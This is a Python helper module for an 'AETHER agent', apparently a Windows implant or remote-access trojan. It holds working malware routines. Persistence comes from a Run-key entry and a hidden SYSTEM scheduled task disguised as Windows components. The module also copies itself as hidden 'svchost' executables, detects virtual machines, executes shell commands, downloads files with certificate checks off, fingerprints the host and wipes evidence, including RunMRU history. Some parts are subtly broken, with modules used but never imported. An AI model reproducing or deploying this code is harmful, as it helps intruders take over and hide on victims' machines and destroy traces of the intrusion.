"""
Utility functions for AETHER agent.
Common helpers used across modules.
"""

import os, sys, platform, hashlib, base64, json, time, random, string, ctypes, ctypes.wintypes
from datetime import datetime
import winreg, win32api, win32con, win32security, win32process
import subprocess, socket, struct, re, inspect, zipfile, io

def get_system_info():
    """Get comprehensive system information."""
    info = {}
    
    try:
        # Basic info
        info['hostname'] = platform.node()
        info['os'] = platform.platform()
        info['architecture'] = platform.architecture()[0]
        info['processor'] = platform.processor()
        info['python_version'] = platform.python_version()
        
        # Windows specific
        if sys.platform == 'win32':
            info['windows_version'] = platform.win32_ver()
            
            # Get edition
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                info['product_name'] = winreg.QueryValueEx(key, "ProductName")[0]
                info['build_number'] = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                info['release_id'] = winreg.QueryValueEx(key, "ReleaseId")[0] if "ReleaseId" in winreg.EnumValue(key, 0)[0] else "N/A"
                winreg.CloseKey(key)
            except:
                pass
        
        # Hardware info
        import psutil
        info['cpu_count'] = psutil.cpu_count()
        info['cpu_percent'] = psutil.cpu_percent(interval=0.1)
        
        mem = psutil.virtual_memory()
        info['memory_total'] = mem.total
        info['memory_available'] = mem.available
        info['memory_percent'] = mem.percent
        
        # Disk info
        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free,
                    'percent': usage.percent
                })
            except:
                pass
        info['disks'] = disks
        
        # Network info
        addrs = psutil.net_if_addrs()
        info['network_interfaces'] = {}
        for iface, addresses in addrs.items():
            info['network_interfaces'][iface] = []
            for addr in addresses:
                info['network_interfaces'][iface].append({
                    'family': str(addr.family),
                    'address': addr.address,
                    'netmask': addr.netmask if hasattr(addr, 'netmask') else None,
                    'broadcast': addr.broadcast if hasattr(addr, 'broadcast') else None
                })
        
        # Users
        users = psutil.users()
        info['users'] = [{'name': u.name, 'terminal': u.terminal, 'host': u.host, 'started': u.started} for u in users]
        
        # Boot time
        info['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
        
        # Process count
        info['process_count'] = len(list(psutil.process_iter()))
        
    except Exception as e:
        info['error'] = str(e)
    
    return info

def is_admin():
    """Check if running as administrator."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def get_integrity_level():
    """Get process integrity level."""
    try:
        import win32security, win32con
        
        # Open current process token
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_QUERY
        )
        
        # Get token information
        token_info = win32security.GetTokenInformation(hToken, win32security.TokenIntegrityLevel)
        
        # Convert SID to integrity level
        sid = token_info.GetSidSubAuthorityCount()
        if sid and sid[0]:
            integrity_level = sid[0]
            levels = {
                0x0000: 'Untrusted',
                0x1000: 'Low',
                0x2000: 'Medium',
                0x3000: 'High',
                0x4000: 'System'
            }
            return levels.get(integrity_level, f'Unknown ({integrity_level:#x})')
        
    except:
        pass
    
    return 'Unknown'

def generate_id(seed=None):
    """Generate unique identifier."""
    if seed is None:
        # Use system information
        seed = f"{platform.node()}{platform.processor()}{os.getpid()}{time.time()}"
    
    # Add randomness
    seed += str(random.getrandbits(256))
    
    # Generate hash
    return hashlib.sha256(seed.encode()).hexdigest()[:16]

def obfuscate_string(s, key=0xAA):
    """Simple string obfuscation."""
    return ''.join(chr(ord(c) ^ key) for c in s)

def deobfuscate_string(s, key=0xAA):
    """Deobfuscate string."""
    return obfuscate_string(s, key)  # XOR is symmetric

def base64_encode(data):
    """Base64 encode data."""
    if isinstance(data, dict):
        data = json.dumps(data)
    if isinstance(data, str):
        data = data.encode()
    
    return base64.b64encode(data).decode()

def base64_decode(data):
    """Base64 decode data."""
    decoded = base64.b64decode(data)
    
    # Try to parse as JSON
    try:
        return json.loads(decoded.decode())
    except:
        return decoded.decode()

def calculate_hash(data, algorithm='sha256'):
    """Calculate hash of data."""
    if isinstance(data, str):
        data = data.encode()
    
    if algorithm == 'md5':
        return hashlib.md5(data).hexdigest()
    elif algorithm == 'sha1':
        return hashlib.sha1(data).hexdigest()
    elif algorithm == 'sha256':
        return hashlib.sha256(data).hexdigest()
    elif algorithm == 'sha512':
        return hashlib.sha512(data).hexdigest()
    else:
        raise ValueError(f"Unsupported algorithm: {algorithm}")

def file_hash(filepath, algorithm='sha256', chunk_size=8192):
    """Calculate hash of file."""
    hash_func = hashlib.new(algorithm)
    
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(chunk_size), b''):
            hash_func.update(chunk)
    
    return hash_func.hexdigest()

def random_string(length=10):
    """Generate random string."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def get_temp_filename(prefix='tmp', suffix='.tmp'):
    """Get temporary filename."""
    temp_dir = os.environ.get('TEMP', os.environ.get('TMP', '.'))
    return os.path.join(temp_dir, f"{prefix}_{random_string(8)}_{int(time.time())}{suffix}")

def execute_command(cmd, timeout=30, shell=True):
    """Execute shell command."""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding='utf-8',
            errors='ignore'
        )
        
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode,
            'success': result.returncode == 0
        }
    except subprocess.TimeoutExpired:
        return {
            'error': 'Command timeout',
            'success': False
        }
    except Exception as e:
        return {
            'error': str(e),
            'success': False
        }

def download_file(url, save_path=None):
    """Download file from URL."""
    try:
        import requests
        
        response = requests.get(url, timeout=30, verify=False)
        response.raise_for_status()
        
        if save_path is None:
            save_path = get_temp_filename(suffix='.downloaded')
        
        with open(save_path, 'wb') as f:
            f.write(response.content)
        
        return {
            'success': True,
            'path': save_path,
            'size': len(response.content),
            'url': url
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'url': url
        }

def create_persistence(agent_path):
    """Create persistence for agent."""
    methods = []
    
    # Registry Run key
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsTextInput", 0, winreg.REG_SZ, agent_path)
        winreg.CloseKey(key)
        methods.append('registry_run')
    except:
        pass
    
    # Scheduled task
    try:
        task_name = "WindowsFontCacheUpdate"
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Updates Windows Font Cache</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{agent_path}"</Command>
    </Exec>
  </Actions>
</Task>'''
        
        xml_path = get_temp_filename(suffix='.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)
        
        subprocess.run(['schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'],
                      capture_output=True, shell=True)
        os.remove(xml_path)
        methods.append('scheduled_task')
    except:
        pass
    
    return methods

def remove_persistence():
    """Remove persistence mechanisms."""
    removed = []
    
    # Remove registry entry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, "WindowsTextInput")
        winreg.CloseKey(key)
        removed.append('registry_run')
    except:
        pass
    
    # Remove scheduled task
    try:
        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsFontCacheUpdate', '/f'],
                      capture_output=True, shell=True)
        removed.append('scheduled_task')
    except:
        pass
    
    return removed

def get_public_ip():
    """Get public IP address."""
    try:
        import requests
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        return None

def check_internet():
    """Check internet connectivity."""
    try:
        import requests
        response = requests.get('https://www.google.com', timeout=5)
        return response.status_code == 200
    except:
        return False

def get_mac_address():
    """Get MAC address."""
    try:
        import uuid
        return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                        for elements in range(0, 8*6, 8)][::-1])
    except:
        return None

def get_volume_serial():
    """Get volume serial number."""
    try:
        kernel32 = ctypes.windll.kernel32
        volume_name = ctypes.create_unicode_buffer(256)
        serial_number = ctypes.c_ulong(0)
        max_component_length = ctypes.c_ulong(0)
        file_system_flags = ctypes.c_ulong(0)
        file_system_name = ctypes.create_unicode_buffer(256)
        
        success = kernel32.GetVolumeInformationW(
            ctypes.c_wchar_p("C:\\"),
            volume_name,
            ctypes.sizeof(volume_name),
            ctypes.byref(serial_number),
            ctypes.byref(max_component_length),
            ctypes.byref(file_system_flags),
            file_system_name,
            ctypes.sizeof(file_system_name)
        )
        
        if success:
            return hex(serial_number.value)[2:].upper()
    except:
        pass
    
    return None

def is_vm():
    """Check if running in virtual machine."""
    checks = []
    
    # Check for VM processes
    vm_processes = [
        'vboxservice.exe', 'vboxtray.exe',  # VirtualBox
        'vmwaretray.exe', 'vmwareuser.exe', # VMware
        'xenservice.exe',                   # Xen
        'qemu-ga.exe'                       # QEMU
    ]
    
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in vm_processes:
                    checks.append('vm_process')
                    break
            except:
                pass
    except:
        pass
    
    # Check MAC address vendor
    mac = get_mac_address()
    if mac:
        vm_mac_prefixes = ['08:00:27', '00:50:56', '00:0C:29', '00:05:69', '00:1C:42']
        if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
            checks.append('vm_mac')
    
    # Check for hypervisor presence via CPUID
    try:
        # This requires ctypes and assembly knowledge
        # Simplified check
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            system_product = winreg.QueryValueEx(key, "SystemProductName")[0]
            if any(vm in system_product.lower() for vm in ['virtual', 'vmware', 'virtualbox', 'qemu', 'xen']):
                checks.append('bios_name')
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass
    
    return len(checks) > 0, checks

def sleep_jitter(base_interval, jitter):
    """Sleep with random jitter."""
    sleep_time = base_interval + random.uniform(-jitter, jitter)
    time.sleep(max(0, sleep_time))

def encrypt_data(data, key):
    """Simple XOR encryption."""
    if isinstance(data, str):
        data = data.encode()
    
    key_bytes = key.encode() if isinstance(key, str) else key
    key_length = len(key_bytes)
    
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_bytes[i % key_length])
    
    return bytes(encrypted)

def decrypt_data(data, key):
    """XOR decryption (same as encryption)."""
    return encrypt_data(data, key)

def create_self_copy():
    """Create a copy of self in another location."""
    current_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    
    # Choose a random location
    locations = [
        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        os.path.join(os.environ['TEMP']),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp')
    ]
    
    for location in locations:
        try:
            os.makedirs(location, exist_ok=True)
            new_name = f"svchost_{random_string(4)}.exe"
            new_path = os.path.join(location, new_name)
            
            shutil.copy2(current_path, new_path)
            
            # Hide the file
            win32file.SetFileAttributes(new_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            
            return new_path
        except:
            continue
    
    return None

def cleanup_evidence():
    """Clean up evidence of execution."""
    removed = []
    
    # Remove temp files
    temp_dir = os.environ['TEMP']
    for filename in os.listdir(temp_dir):
        if filename.startswith('Aether') or filename.startswith('tmp_'):
            try:
                filepath = os.path.join(temp_dir, filename)
                if os.path.isfile(filepath):
                    os.remove(filepath)
                    removed.append(filename)
                elif os.path.isdir(filepath):
                    shutil.rmtree(filepath)
                    removed.append(filename)
            except:
                pass
    
    # Clear recent commands from registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                            0, winreg.KEY_WRITE)
        
        # Delete all values except default
        i = 0
        while True:
            try:
                value_name = winreg.EnumValue(key, i)[0]
                if value_name != '':
                    winreg.DeleteValue(key, value_name)
                i += 1
            except OSError:
                break
        
        winreg.CloseKey(key)
        removed.append('run_mru')
    except:
        pass
    
    return removed